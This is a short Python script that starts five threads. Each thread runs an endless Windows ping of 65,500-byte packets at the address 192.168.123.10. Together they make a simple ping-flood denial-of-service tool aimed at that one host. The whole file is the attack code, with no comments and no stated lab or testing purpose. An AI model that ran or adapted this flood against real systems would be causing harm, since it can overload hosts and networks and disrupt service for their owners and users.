import os
import threading
def ping(): 
  a = os.system('ping -l 65500 -t 192.168.123.10')

a1 = threading.Thread(target=ping)
a2 = threading.Thread(target=ping)
a3 = threading.Thread(target=ping)
a4 = threading.Thread(target=ping)
a5 = threading.Thread(target=ping)

a1.start()
a2.start()
a3.start()
a4.start()
a5.start()